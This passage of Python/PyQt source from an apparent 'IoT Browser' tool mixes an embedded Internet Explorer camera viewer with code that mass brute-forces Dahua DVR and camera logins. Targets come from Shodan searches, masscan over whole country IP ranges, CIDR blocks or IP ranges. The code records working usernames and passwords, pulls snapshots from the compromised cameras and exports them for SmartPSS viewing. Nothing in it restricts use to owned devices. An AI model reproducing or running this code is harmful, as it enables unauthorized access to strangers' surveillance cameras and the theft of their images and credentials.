        self.ie_frame.hide()
        self.web_view.hide()
        if self.use_ie:
            self.setup_ie()
            self.ie_frame.show()
        else:
            self.setup_webengine()
            self.web_view.show()
        self.resize_browser_container()

    def setup_webengine(self):
        self.web_view.setUrl(QUrl("about:blank"))
        self.log("Using Qt WebEngine for camera viewing (no ActiveX support).", "warning")

    def setup_ie(self):
        if not self.use_ie: return
        if self.ie:
            try: self.ie.Quit()
            except: pass
        try:
            self.ie = win32com.client.Dispatch("InternetExplorer.Application")
            self.ie.Visible = 1
            self.ie.AddressBar = False
            self.ie.StatusBar = False
            self.ie.ToolBar = 0
            self.ie.MenuBar = False
            self.ie.Width = 800
            self.ie.Height = 600
            self.ie.Navigate("about:blank")
            while self.ie.ReadyState != 4:
                pythoncom.PumpWaitingMessages()
                QApplication.processEvents()

            def enum_handler(hwnd, ctx):
                if win32gui.IsWindowVisible(hwnd) and "Internet Explorer" in win32gui.GetWindowText(hwnd):
                    self.ie_hwnd = hwnd
            win32gui.EnumWindows(enum_handler, None)
            if self.ie_hwnd:
                win32gui.SetParent(self.ie_hwnd, int(self.ie_frame.winId()))
                style = (win32con.WS_VISIBLE | win32con.WS_CHILD | win32con.WS_CLIPCHILDREN |
                         win32con.WS_CLIPSIBLINGS | win32con.WS_VSCROLL | win32con.WS_HSCROLL)
                win32gui.SetWindowLong(self.ie_hwnd, win32con.GWL_STYLE, style)
                win32gui.SetWindowLong(self.ie_hwnd, win32con.GWL_EXSTYLE, win32con.WS_EX_NOPARENTNOTIFY)
                win32gui.ShowWindow(self.ie_hwnd, win32con.SW_SHOW)
                win32gui.UpdateWindow(self.ie_hwnd)
                try:
                    doc = self.ie.Document
                    if doc:
                        doc.parentWindow.execScript("""
                            var meta = document.createElement('meta');
                            meta.httpEquiv = 'X-UA-Compatible';
                            meta.content = 'IE=11';
                            document.head.appendChild(meta);
                            document.documentMode = 11;
                        """, "JavaScript")
                except: pass
                QTimer.singleShot(500, self.focus_ie)
            else:
                raise Exception("IE window not found")
        except Exception as e:
            self.log(f"IE setup failed: {e} - Falling back to WebEngine", "error")
            self.use_ie = False
            self.setup_webengine()
            self.web_view.show()

    def navigate_start_page(self):
        dark_html = """
        <html><body style="background:#0d1b2a; margin:0; overflow:auto; color:#a8e6cf; font-family:Segoe UI;">
          <div style="text-align:center; padding-top:120px; font-size:18px;">
            <h2 style="color:#00d4ff;">IoT Browser / Version 0.6</h2>
            <p>IE11 MODE Required for most Devices | Double Click on an IP to Display in here or Type in a URL</p>
            <p>Browser: {} | (Optional)Plugin status: {}</p>
          </div>
        </body></html>
        """.format("IE" if self.use_ie else "WebEngine", "Checking..." if self.use_ie else "N/A")
        if self.use_ie and self.ie:
            try:
                doc = self.ie.Document
                doc.body.innerHTML = dark_html
            except: pass
        else:
            self.web_view.setHtml(dark_html)

    def show_advanced_dialog(self):
        dlg = QDialog(self)
        dlg.setWindowTitle("Preferences")
        dlg.resize(520, 430)
        layout = QFormLayout(dlg)

        timeout_edit = QSpinBox()
        timeout_edit.setRange(1, 60)
        timeout_edit.setValue(self.timeout_spin.value())
        layout.addRow("Timeout (sec):", timeout_edit)

        delay_edit = QSpinBox()
        delay_edit.setRange(0, 10000)
        delay_edit.setValue(self.delay_spin.value())
        delay_edit.setSuffix(" ms")
        layout.addRow("API Delay:", delay_edit)

        http_proxy_edit = QLineEdit(self.proxy_http.text())
        socks_proxy_edit = QLineEdit(self.proxy_socks.text())
        layout.addRow("HTTP Proxy:", http_proxy_edit)
        layout.addRow("SOCKS Proxy:", socks_proxy_edit)

        auto_load_edit = QCheckBox("Auto-load last session")
        auto_load_edit.setChecked(self.auto_load_check.isChecked())
        debug_edit = QCheckBox("Enable debug logging")
        debug_edit.setChecked(self.debug_check.isChecked())
        layout.addRow(auto_load_edit)
        layout.addRow(debug_edit)

        auto_refresh_edit = QCheckBox("Enable automatic refresh")
        auto_refresh_edit.setChecked(self.auto_check.isChecked())
        refresh_interval_edit = QSpinBox()
        refresh_interval_edit.setRange(0, 3600)
        refresh_interval_edit.setSuffix(" sec")
        refresh_interval_edit.setValue(self.auto_spin.value())
        layout.addRow(auto_refresh_edit)
        layout.addRow("Refresh interval:", refresh_interval_edit)

        sound_enabled_edit = QCheckBox("Play completion sound after scans")
        sound_enabled_edit.setChecked(self.completion_sound_enabled)
        layout.addRow(sound_enabled_edit)

        sound_path_edit = QLineEdit(self.completion_sound_path)
        browse_sound_btn = QPushButton("Browse...")
        test_sound_btn = QPushButton("Test")
        sound_buttons = QHBoxLayout()
        sound_buttons.addWidget(sound_path_edit, 1)
        sound_buttons.addWidget(browse_sound_btn)
        sound_buttons.addWidget(test_sound_btn)
        layout.addRow("Completion sound:", sound_buttons)

        browse_sound_btn.clicked.connect(
            lambda: self._choose_completion_sound(sound_path_edit)
        )
        test_sound_btn.clicked.connect(
            lambda: self._preview_completion_sound(sound_path_edit.text())
        )

        btns = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        btns.accepted.connect(dlg.accept)
        btns.rejected.connect(dlg.reject)
        layout.addRow(btns)
        if dlg.exec() == QDialog.DialogCode.Accepted:
            self.timeout_spin.setValue(timeout_edit.value())
            self.delay_spin.setValue(delay_edit.value())
            self.proxy_http.setText(http_proxy_edit.text())
            self.proxy_socks.setText(socks_proxy_edit.text())
            self.auto_load_check.setChecked(auto_load_edit.isChecked())
            self.debug_check.setChecked(debug_edit.isChecked())
            self.auto_check.setChecked(auto_refresh_edit.isChecked())
            self.auto_spin.setValue(refresh_interval_edit.value())
            self.completion_sound_enabled = sound_enabled_edit.isChecked()
            self.completion_sound_path = sound_path_edit.text().strip() or COMPLETION_SOUND
            self.save_settings()

    def _choose_completion_sound(self, target_edit):
        path, _ = QFileDialog.getOpenFileName(
            self,
            "Choose Completion Sound",
            str(Path(self.completion_sound_path).parent),
            "Audio Files (*.wav *.mp3 *.m4a);;All Files (*)",
        )
        if path:
            target_edit.setText(path)

    def _resolve_completion_sound_path(self):
        configured = Path(self.completion_sound_path)
        if configured.is_absolute() and configured.exists():
            return configured
        project_path = Path(__file__).resolve().parent / configured
        return project_path if project_path.exists() else configured

    def _preview_completion_sound(self, path):
        candidate = Path(path.strip()) if path.strip() else Path(COMPLETION_SOUND)
        if not candidate.is_absolute():
            project_candidate = Path(__file__).resolve().parent / candidate
            if project_candidate.exists():
                candidate = project_candidate
        if candidate.exists():
            self._play_sound(str(candidate))
        else:
            QMessageBox.warning(self, "Sound Not Found", f"No audio file exists at:\n{candidate}")

    def troubleshoot_display(self):
        if not self.use_ie:
            msg = "<h3>WebEngine in Use</h3><p>No ActiveX support. For legacy Hikvision streams, enable IE mode if available.</p>"
        else:
            msg = """
            <h3>Auto-Fix Applied!</h3>
            <p>Registry tweaks for ActiveX, Trusted Sites, IE11, and GPU disabled.</p>
            <p>IE re-embedded. Load a camera to test.</p>
            <ul>
            <li>Still black? Click viewer > F12 > Console > Run: WebVideoCtrl.I_InitPlugin();</li>
            <li>Or select Sub Stream in dropdown.</li>
            <li>Run app as Administrator for best results.</li>
            </ul>
            """
        QMessageBox.information(self, "Fix Camera Display", msg)
        if self.use_ie:
            self.auto_fix_ie_for_hikvision()

    def resize_browser_container(self):
        rect = self.browser_container.geometry()
        w, h = rect.width(), rect.height()
        if w > 0 and h > 0:
            if self.use_ie and self.ie_hwnd:
                win32gui.MoveWindow(self.ie_hwnd, 0, 0, w, h, True)
                try:
                    self.ie.Document.parentWindow.execScript("document.body.style.zoom = '100%';", "JavaScript")
                except: pass
            self.web_view.resize(w, h)

    def focus_ie(self):
        if not self.use_ie or not self.ie_hwnd: return
        try:
            win32gui.SetForegroundWindow(self.ie_hwnd)
            win32gui.SetFocus(self.ie_hwnd)
            ctid = win32api.GetCurrentThreadId()
            ietid, _ = win32process.GetWindowThreadProcessId(self.ie_hwnd)
            win32process.AttachThreadInput(ietid, ctid, True)
            win32gui.SendMessage(self.ie_hwnd, win32con.WM_ACTIVATE, win32con.WA_ACTIVE, 0)
            win32gui.SendMessage(self.ie_hwnd, win32con.WM_SETFOCUS, 0, 0)
            win32process.AttachThreadInput(ietid, ctid, False)
        except Exception as e:
            self.log(f"Focus error: {e}", "warning")

    def eventFilter(self, obj, event):
        if self.use_ie and obj is self.ie_frame:
            if event.type() in (QEvent.Type.MouseButtonPress, QEvent.Type.MouseButtonDblClick, QEvent.Type.FocusIn):
                try:
                    fw = QApplication.focusWidget()
                    if fw: fw.clearFocus()
                    self.focus_ie()
                except: pass
        return super().eventFilter(obj, event)

    def on_tab_changed(self, index):
        table, key = self._get_active_table_and_key()
        if table and self.current_index[key] >= 0 and self.current_index[key] < table.rowCount():
            table.selectRow(self.current_index[key])
            self.scroll_to_current(table)

    def scroll_to_current(self, table):
        idx = self.current_index.get(self._get_key_from_table(table), -1)
        if idx >= 0:
            table.scrollToItem(table.item(idx, 0), QTableWidget.ScrollHint.PositionAtCenter)

    def _get_key_from_table(self, table):
        if table == self.table: return "all"
        if table == self.good_table: return "good"
        if table == self.bad_table: return "bad"
        if table == self.port22_table: return "port22"
        if table == self.fav_table: return "fav"
        return None

    def on_row_double_click(self, mi):
        table = self.sender()
        row = mi.row()
        brand = self.brand_combo.currentText()
        if brand in ("IP Scanner", "Dahua"):
            ip_item = table.item(row, 0)
            hostname_item = table.item(row, 1)
            target = self.extract_target_host(ip_item.text() if ip_item else "")
            if hostname_item and hostname_item.text().strip():
                target = self.extract_target_host(hostname_item.text().strip())
            if not target:
                return
            url = f"http://{target}"
            self.url_bar.setText(url)
            self.load_url_with_retry(url)
            key = self._get_key_from_table(table)
            if key:
                self.current_index[key] = row
                self.scroll_to_current(table)
        else:
            url_item = table.item(row, 1)
            if url_item:
                url = url_item.text()
                self.url_bar.setText(url)
                self.load_url_with_retry(url)
                key = self._get_key_from_table(table)
                if key:
                    self.current_index[key] = row
                    self.scroll_to_current(table)

    def on_fav_double_click(self, mi):
        row = mi.row()
        url_item = self.fav_table.item(row, 1)
        if url_item:
            url = url_item.text()
            self.url_bar.setText(url)
            self.load_url_with_retry(url)
            self.current_index["fav"] = row
            self.scroll_to_current(self.fav_table)

    def show_fav_context_menu(self, pos):
        menu = QMenu(self)
        remove_act = menu.addAction("🗑 Remove Selected Favorite")
        remove_act.triggered.connect(self.remove_selected_favorite)
        menu.exec(self.fav_table.mapToGlobal(pos))

    def remove_selected_favorite(self):
        row = self.fav_table.currentRow()
        if row >= 0:
            url_item = self.fav_table.item(row, 1)
            if url_item:
                url = url_item.text()
                self.saved_favorites = [f for f in self.saved_favorites if f.get("url") != url]
                self.update_favorites_table()
                self.save_favorites()
                self.log(f"Removed favorite: {url}", "info")

    def load_url(self):
        url = self.url_bar.text().strip()
        if not url: return
        # Only add http:// if no scheme is present (preserve rtsp://, https://, etc.)
        if not url.startswith(("http://", "https://", "rtsp://", "file://")):
            url = "http://" + url
        self.load_url_with_retry(url)

    def load_url_with_retry(self, url):
        if self.use_ie:
            if not self.ie:
                self.log("IE not ready.", "error")
                return
            self.ie.Navigate(url)
            QTimer.singleShot(3000, lambda: self.check_and_download_webcomponents(url))
            QTimer.singleShot(5000, lambda: self.force_plugin_init(url))
            QTimer.singleShot(1500, self.focus_ie)
        else:
            self.web_view.load(QUrl(url))
            self.log("Loaded in WebEngine. Note: Modern pages/snapshots only (no ActiveX).", "info")

    def check_and_download_webcomponents(self, url):
        if not self.use_ie: return
        try:
            doc = self.ie.Document
            if doc and "WebComponents" in doc.body.innerHTML:
                self.download_webcomponents(url)
        except: pass

    def force_plugin_init(self, url):
        if not self.use_ie: return
        try:
            doc = self.ie.Document
            if doc:
                self.log("Forcing Hikvision plugin initialization...", "info")
                doc.parentWindow.execScript("""
                    if (typeof(WebVideoCtrl) !== 'undefined') {
                        WebVideoCtrl.I_InitPlugin();
                        WebVideoCtrl.I_Resize(800, 600)
                        WebVideoCtrl.I_StartPlay();
                    } else if (typeof(pluginInit) === 'function') {
                        pluginInit();
                    }
                    var streamSelect = document.getElementById('streamselect');
                    if (streamSelect) streamSelect.value = 'sub';
                """, "JavaScript")
                self.log("Plugin init forced. Try Sub Stream if still black.", "info")
        except Exception as e:
            self.log(f"Plugin init failed: {e}", "warning")

    def refresh_browser(self):
        if self.use_ie:
            self.ie.Refresh()
            QTimer.singleShot(1500, self.focus_ie)
        else:
            self.web_view.reload()

    def capture_snapshot(self):
        self.log("Use Snipping Tool or Print Screen to capture stream", "warning")

    def _wrapper_start_dahua_brute(self):
        """Call Dahua brute force (credentials testing on loaded results)."""
        self.start_dahua_brute()

    def _wrapper_start_dahua_masscan(self):
        """Wrapper to call Dahua masscan from integration module."""
        from modules.dahua_integration import start_dahua_masscan
        start_dahua_masscan(self)

    def _wrapper_export_pss_xml(self):
        """Wrapper to call Dahua export from integration module."""
        from modules.dahua_integration import export_pss_xml_selected
        export_pss_xml_selected(self)

    def start_dahua_brute(self):
        brand = self.brand_combo.currentText()
        if brand != "Dahua":
            QMessageBox.information(self, "Dahua required", "Switch to Dahua mode to use this action.")
            return
        if not self.results:
            QMessageBox.information(self, "No IPs", "No results loaded. Load a previous session or run a scan first.")
            return
        # If user selected rows, offer to brute only those
        sel = self.table.selectionModel().selectedRows()
        use_selected = False
        if sel:
            if QMessageBox.question(self, "Selected Rows", f"{len(sel)} rows selected. Brute only selected rows?",
                                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
                use_selected = True

        # Prepare target list
        targets = []
        source = []
        if use_selected:
            for idx in sel:
                try:
                    row = idx.row()
                    data = self.results[row]
                    source.append(data)
                except Exception:
                    continue
        else:
            source = list(self.results)

        for data in source:
            ip = data.get('ip') or ''
            if not ip: continue
            port = 37777
            # prefer explicit open_ports if available
            if data.get('open_ports'):
                try:
                    ports = [int(p.strip()) for p in str(data.get('open_ports')).split(',') if p.strip()]
                    if 37777 in ports:
                        port = 37777
                    elif ports:
                        port = ports[0]
                except:
                    port = 37777
            else:
                try:
                    port = int(self.port_spin.value() or 37777)
                except:
                    port = 37777
            targets.append(f"{ip}:{port}")

        threads, ok = QInputDialog.getInt(self, "Concurrency", "Number of threads:", self.scan_concurrency_spin.value(), 1, 2000)
        if not ok: return
        timeout, ok = QInputDialog.getInt(self, "Timeout", "Connection timeout (sec):", self.timeout_spin.value(), 1, 60)
        if not ok: return

        scanner = DahuaScanner()
        credentials = self._load_dahua_credentials()
        self._seed_dahua_brute_tab(targets)

        def log_cb(level, msg):
            QTimer.singleShot(0, lambda: self.log(msg, level))

        def prog_cb(pct):
            QTimer.singleShot(0, lambda: self.progress.setValue(int(pct)))

        def set_dahua_controls(enabled: bool):
            try:
                self.dahua_masscan_btn.setEnabled(enabled)
                self.dahua_brute_btn.setEnabled(enabled)
                self.dahua_snap_btn.setEnabled(enabled)
                self.dahua_export_xml_btn.setEnabled(enabled)
            except Exception:
                pass

        set_dahua_controls(False)

        def worker():
            try:
                summary = scanner.brute_ips(targets, credentials=credentials, threads=threads, timeout=timeout, log=log_cb, progress=prog_cb)
                QTimer.singleShot(0, lambda: self.on_dahua_brute_done(summary, targets))
            except Exception as e:
                QTimer.singleShot(0, lambda: self.log(f"Dahua brute error: {e}", "error"))
            finally:
                QTimer.singleShot(0, lambda: set_dahua_controls(True))

        threading.Thread(target=worker, daemon=True).start()
        self.log("Dahua brute started in background.", "info")

    def on_dahua_brute_done(self, summary, targets=None):
        total = summary.get('total', 0)
        okc = summary.get('success', 0)
        errc = summary.get('failed', 0)
        self.log(f"Dahua brute finished: {total} total, {okc} OK, {errc} failed. Results saved to {summary.get('results_dir')}", "success")
        seen = {r.get('ip') for r in self.results if r.get('ip')}
        for ip, port in self._normalize_targets(targets):
            if ip not in seen:
                data = {"ip": ip, "url": f"http://{ip}", "status": "failed", "code": 0, "port": port,
                        "hostname": ip, "open_ports": str(port), "banners": "Masscan pending", "web_detect": "Dahua"}
                self.add_result_row(data)
                seen.add(ip)
        for s in summary.get('successes', []):
            ip = s.get('ip')
            if not ip: continue
            data = {"ip": ip, "url": f"http://{ip}", "status": "ok", "code": 200,
                    "login": s.get('login'), "password": s.get('password'), "controller": s.get('controller'),
                    "port": s.get('port', 37777), "hostname": ip, "open_ports": str(s.get('port', 37777)),
                    "banners": "Dahua auth OK", "web_detect": "Dahua"}
            if self._update_dahua_result_row(ip, data):
                pass
            else:
                self.add_result_row(data)
            self._upsert_brute_result_row({
                "ip": ip,
                "status": "Auth OK",
                "login": s.get('login', ''),
                "password": s.get('password', ''),
                "notes": f"Auth OK on port {s.get('port', 37777)}",
            })
        for ip, port in self._normalize_targets(targets):
            if not any(r.get('ip') == ip and r.get('status') == 'ok' for r in self.results):
                self._update_dahua_result_row(ip, {
                    'status': 'failed',
                    'code': 0,
                    'hostname': ip,
                    'open_ports': str(port),
                    'banners': 'Dahua auth failed',
                    'web_detect': 'Dahua',
                })
                self._upsert_brute_result_row({
                    "ip": ip,
                    "status": "Failed",
                    "login": "",
                    "password": "",
                    "notes": f"No valid credential found on port {port}",
                })
        self.update_filtered_tables(force=True)
        self.load_history_table()
        self._auto_export_smartpss_xml()
        self.log(
            f"Dahua scan complete: {self.table.rowCount()} total in All, "
            f"{self.good_table.rowCount()} in Good, {self.bad_table.rowCount()} in Bad",
            "success",
        )

    def start_dahua_snapshots(self):
        brand = self.brand_combo.currentText()
        if brand != "Dahua":
            QMessageBox.information(self, "Dahua required", "Switch to Dahua mode to use this action.")
            return
        # collect successful entries from current results (accept both 'ok' and 'auth_ok')
        sel = self.table.selectionModel().selectedRows()
        use_selected = False
        if sel:
            if QMessageBox.question(self, "Selected Rows", f"{len(sel)} rows selected. Capture snapshots only for selected?",
                                    QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
                use_selected = True

        if use_selected:
            successes = []
            for idx in sel:
                try:
                    data = self.results[idx.row()]
                    if data.get('status') in ('ok', 'auth_ok'):
                        successes.append(data)
                except Exception:
                    continue
        else:
            successes = [r for r in self.results if r.get('status') in ('ok', 'auth_ok')]

        if not successes:
            QMessageBox.information(self, "No Good Devices", "No successful devices in results to capture snapshots from.")
            return
        threads, ok = QInputDialog.getInt(self, "Snapshot Threads", "Concurrent snapshot threads:", 30, 1, 500)
        if not ok: return

        scanner = DahuaScanner()

        def log_cb(level, msg):
            QTimer.singleShot(0, lambda: self.log(msg, level))

        def prog_cb(pct):
            QTimer.singleShot(0, lambda: self.progress.setValue(int(pct)))

        def set_dahua_controls(enabled: bool):
            try:
                self.dahua_masscan_btn.setEnabled(enabled)
                self.dahua_brute_btn.setEnabled(enabled)
                self.dahua_snap_btn.setEnabled(enabled)
                self.dahua_export_xml_btn.setEnabled(enabled)
            except Exception:
                pass

        set_dahua_controls(False)

        def worker():
            try:
                summary = scanner.capture_snapshots(successes, threads=threads, log=log_cb, progress=prog_cb)
                QTimer.singleShot(0, lambda: self.on_dahua_snapshots_done(summary))
            except Exception as e:
                QTimer.singleShot(0, lambda: self.log(f"Snapshot error: {e}", "error"))
            finally:
                QTimer.singleShot(0, lambda: set_dahua_controls(True))

        threading.Thread(target=worker, daemon=True).start()
        self.log("Dahua snapshot capture started in background.", "info")

    def on_dahua_snapshots_done(self, summary):
        saved = summary.get('saved', 0)
        errors = summary.get('errors', 0)
        self.log(f"Snapshot capture complete: {saved} saved, {errors} errors. Files in {summary.get('results_dir')}", "success")
        self.load_history_table()

    def _dahua_shodan_query(self):
        """Shodan query for the Dahua 'Shodan' scan method: finds devices with the
        Dahua DVRIP port open (default 37777 - what the brute connects to),
        optionally filtered by the selected country. Broad on purpose for max hits."""
        port = int(self.port_spin.value() or 37777)
        q = f'port:{port}'
        try:
            cc = COUNTRY_CODES.get(self.country_combo.currentText(), "")
            if cc:
                q += f' country:"{cc}"'
        except Exception:
            pass
        return q

    def start_dahua_masscan(self):
        brand = self.brand_combo.currentText()
        if brand != "Dahua":
            QMessageBox.information(self, "Dahua required", "Switch to Dahua mode to use this action.")
            return
        # Determine scan method (Masscan / CIDR / IP Range / Current Results)
        try:
            method = self.scan_method_combo.currentText()
        except Exception:
            method = "Masscan"

        scanner = DahuaScanner()
        credentials = self._load_dahua_credentials()

        def log_cb(level, msg):
            QTimer.singleShot(0, lambda: self.log(msg, level))

        def prog_cb(pct):
            QTimer.singleShot(0, lambda: self.progress.setValue(int(pct)))

        # utility to disable/enable dahua quick-controls while scanning
        def set_dahua_controls(enabled: bool):
            try:
                self.dahua_masscan_btn.setEnabled(enabled)
                self.dahua_brute_btn.setEnabled(enabled)
                self.dahua_snap_btn.setEnabled(enabled)
                self.dahua_export_xml_btn.setEnabled(enabled)
            except Exception:
                pass

        set_dahua_controls(False)

        # MASSCAN / AUTO path
        if method in ("Masscan", "Auto"):
            use_current = False
            using_country_fallback = False
            if self.results:
                reply = QMessageBox.question(self, "Masscan Targets", "Use currently loaded results as targets?\n(Otherwise select a target file)", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
                use_current = (reply == QMessageBox.StandardButton.Yes)

            targets_file = None
            temp_path = None
            if use_current:
                try:
                    tf = tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.txt')
                    for r in self.results:
                        ip = r.get('ip')
                        if ip:
                            tf.write(str(ip) + '\n')
                    tf.flush(); tf.close()
                    targets_file = tf.name
                    temp_path = tf.name
                except Exception as e:
                    self.log(f"Failed to create temp targets file: {e}", "error")
                    set_dahua_controls(True)
                    return
            else:
                path, _ = QFileDialog.getOpenFileName(self, "Select targets file (one IP/CIDR per line)", "", "Text Files (*.txt);;All Files (*)")
                using_country_fallback = False
            if not path:
                country = self.country_combo.currentText().strip() if hasattr(self, 'country_combo') else ''
                if country and country.lower() != 'all':
                    answer = QMessageBox.question(
                        self,
                        "Use Country Ranges?",
                        f"No target file selected. Use IPDeny country ranges for {country} instead?",
                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                    )
                    if answer == QMessageBox.StandardButton.Yes:
                        targets_file = self._build_country_targets_file(country, max_ips=1000000)
                        temp_path = targets_file
                        using_country_fallback = True
                        if not targets_file:
                            set_dahua_controls(True)
                            return
                    else:
                        set_dahua_controls(True)
                        return
                else:
                    set_dahua_controls(True)
                    return
            else:
                targets_file = path

            rate, ok = QInputDialog.getInt(self, "Masscan Rate", "Packets/sec rate:", 1000, 1, 1000000)
            if not ok:
                if temp_path:
                    try: os.remove(temp_path)
                    except: pass
                set_dahua_controls(True)
                return
            timeout, ok = QInputDialog.getInt(self, "Probe Timeout", "Connection timeout (sec):", self.timeout_spin.value(), 1, 120)
            if not ok:
                if temp_path:
                    try: os.remove(temp_path)
                    except: pass
                set_dahua_controls(True)
                return

            threads, ok = QInputDialog.getInt(self, "Concurrency", "Number of brute threads:", self.scan_concurrency_spin.value(), 1, 2000)
            if not ok:
                if temp_path:
                    try: os.remove(temp_path)
                    except: pass
                set_dahua_controls(True)
                return

            if using_country_fallback:
                self.log(f"Dahua scan: using backup CIDR range targets for {country}.", "info")
            elif use_current:
                self.log("Dahua scan: using current results as masscan targets.", "info")
            else:
                self.log(f"Dahua scan: using target file {targets_file}.", "info")

            # resolve masscan binary (settings override > PATH)
            masscan_bin = self.settings.value("masscan_path", "") or shutil.which('masscan') or "masscan"
            if not Path(str(masscan_bin)).exists() and not shutil.which('masscan'):
                QMessageBox.information(self, "masscan not found", "masscan not found. Configure it in Settings -> Manage Masscan.")
                set_dahua_controls(True)
                return

            out_path = tempfile.NamedTemporaryFile(delete=False, suffix='.txt').name

            self._seed_dahua_brute_tab([])

            def worker_masscan():
                try:
                    log_cb('info', f"Running masscan via {masscan_bin} on {targets_file}")
                    parsed = scanner.run_masscan(targets_file, ports=str(self.port_spin.value() or 37777), output_file=out_path, rate=rate, log=log_cb, masscan_bin=masscan_bin)
                    if not parsed:
                        QTimer.singleShot(0, lambda: self.log("Masscan returned no hosts.", "warning"))
                        return
                    QTimer.singleShot(0, lambda: self._seed_dahua_scan_results(parsed))
                    summary = scanner.brute_ips(parsed, credentials=credentials, threads=threads, timeout=timeout, out_dir=None, log=log_cb, progress=prog_cb)
                    QTimer.singleShot(0, lambda: self.on_dahua_brute_done(summary, parsed))
                except FileNotFoundError:
                    QTimer.singleShot(0, lambda: self.log("masscan executable not found or not executable.", "error"))
                except Exception as e:
                    QTimer.singleShot(0, lambda: self.log(f"Masscan error: {e}", "error"))
                finally:
                    if temp_path:
                        try: os.remove(temp_path)
                        except: pass
                    try: os.remove(out_path)
                    except: pass
                    QTimer.singleShot(0, lambda: set_dahua_controls(True))

            threading.Thread(target=worker_masscan, daemon=True).start()
            self.log("Dahua masscan started in background.", "info")
            return

        # SHODAN path -> query Shodan for Dahua devices, then brute the hits with
        # the same DahuaController pipeline the other methods use.
        if method == "Shodan":
            query = self._dahua_shodan_query()
            pages = self.pages_spin.value() if self.pages_spin.isVisible() else 5
            port = int(self.port_spin.value() or 37777)
            threads, ok = QInputDialog.getInt(self, "Concurrency", "Number of brute threads:", self.scan_concurrency_spin.value(), 1, 2000)
            if not ok:
                set_dahua_controls(True)
                return
            timeout, ok = QInputDialog.getInt(self, "Timeout", "Connection timeout (sec):", self.timeout_spin.value(), 1, 120)
            if not ok:
                set_dahua_controls(True)
                return
            self.log(f"Dahua Shodan scan: query '{query}', up to {pages} page(s).", "info")

            def worker_shodan():
                try:
                    import shodan as _shodan
                    api = _shodan.Shodan(API_KEY)
                    ips = []
                    for pg in range(1, pages + 1):
                        try:
                            res = api.search(query, page=pg)
                        except Exception as se:
                            QTimer.singleShot(0, lambda se=se: self.log(f"Shodan error: {se}", "error"))
                            break
                        matches = res.get("matches", [])
                        for m in matches:
                            ip = m.get("ip_str")
                            if ip:
                                ips.append(f"{ip}:{port}")
                        if not matches:
                            break
                    ips = list(dict.fromkeys(ips))  # dedupe, keep order
                    if not ips:
                        QTimer.singleShot(0, lambda: self.log("Shodan returned no Dahua hosts.", "warning"))
                        return
                    QTimer.singleShot(0, lambda n=len(ips): self.log(f"Shodan found {n} Dahua host(s); brute-forcing...", "info"))
                    summary = scanner.brute_ips(ips, credentials=credentials, threads=threads, timeout=timeout, out_dir=None, log=log_cb, progress=prog_cb)
                    QTimer.singleShot(0, lambda: self.on_dahua_brute_done(summary, ips))
                except Exception as e:
                    QTimer.singleShot(0, lambda e=e: self.log(f"Dahua Shodan scan error: {e}", "error"))
                finally:
                    QTimer.singleShot(0, lambda: set_dahua_controls(True))

            threading.Thread(target=worker_shodan, daemon=True).start()
            self.log("Dahua Shodan scan started in background.", "info")
            return

        # CIDR / IP Range / Current Results path -> brute directly
        targets = []
        port = int(self.port_spin.value() or 37777)
        if method == "CIDR":
            cidr = self.cidr_edit.text().strip()
            if not cidr:
                QMessageBox.warning(self, "CIDR Required", "Please enter a CIDR in the Subnet field.")
                set_dahua_controls(True)
                return
            try:
                net = ipaddress.ip_network(cidr, strict=False)
            except Exception as e:
                QMessageBox.warning(self, "Invalid CIDR", f"Invalid CIDR: {e}")
                set_dahua_controls(True)
                return
            total_hosts = net.num_addresses
            if total_hosts > 10000:
                if QMessageBox.question(self, "Large Scan", f"CIDR expands to {total_hosts} addresses. Continue?",
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) != QMessageBox.StandardButton.Yes:
                    set_dahua_controls(True)
                    return
            for ip in net.hosts():
                targets.append(f"{str(ip)}:{port}")

        elif method == "IP Range":
            start_ip = self.ip_start_edit.text().strip()
            end_ip = self.ip_end_edit.text().strip()
            if not start_ip or not end_ip:
                QMessageBox.warning(self, "IP Range Required", "Please enter both Start IP and End IP for IP Range scanning.")
                set_dahua_controls(True)
                return
            try:
                s = ipaddress.ip_address(start_ip)
                e = ipaddress.ip_address(end_ip)
            except Exception as e:
                QMessageBox.warning(self, "Invalid IP", f"Invalid IP address: {e}")
                set_dahua_controls(True)
                return
            if int(e) < int(s):
                QMessageBox.warning(self, "Invalid Range", "End IP must be greater than or equal to Start IP.")
                set_dahua_controls(True)
                return
            count = int(e) - int(s) + 1
            if count > 10000:
                if QMessageBox.question(self, "Large Scan", f"Range contains {count} addresses. Continue?",
                                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) != QMessageBox.StandardButton.Yes:
                    set_dahua_controls(True)
                    return
            cur = int(s)
            while cur <= int(e):
                targets.append(f"{str(ipaddress.ip_address(cur))}:{port}")
                cur += 1

        elif method == "Current Results":
            for data in self.results:
                ip = data.get('ip') or ''
                if not ip: continue
                targets.append(f"{ip}:{port}")

        else:
            QMessageBox.information(self, "Unknown Method", f"Unknown scan method: {method}")
            set_dahua_controls(True)
            return

        # Ask concurrency/timeout and run brute
        threads, ok = QInputDialog.getInt(self, "Concurrency", "Number of brute threads:", self.scan_concurrency_spin.value(), 1, 2000)
        if not ok:
            set_dahua_controls(True)
            return
        timeout, ok = QInputDialog.getInt(self, "Timeout", "Connection timeout (sec):", self.timeout_spin.value(), 1, 120)
        if not ok:
            set_dahua_controls(True)
            return

        def worker_brute():
            try:
                summary = scanner.brute_ips(targets, credentials=credentials, threads=threads, timeout=timeout, out_dir=None, log=log_cb, progress=prog_cb)
                QTimer.singleShot(0, lambda: self.on_dahua_brute_done(summary, targets))
            except Exception as e:
                QTimer.singleShot(0, lambda: self.log(f"Dahua brute error: {e}", "error"))
            finally:
                QTimer.singleShot(0, lambda: set_dahua_controls(True))

        threading.Thread(target=worker_brute, daemon=True).start()
        self.log("Dahua brute started in background.", "info")

    def _collect_good_dahua_devices(self):
        """Devices with a confirmed working credential (status ok/auth_ok), ready for SmartPSS XML export."""
        return [{
            'ip': r.get('ip'),
            'port': int(r.get('port') or 37777),
            'login': r.get('login', ''),
            'password': r.get('password', ''),
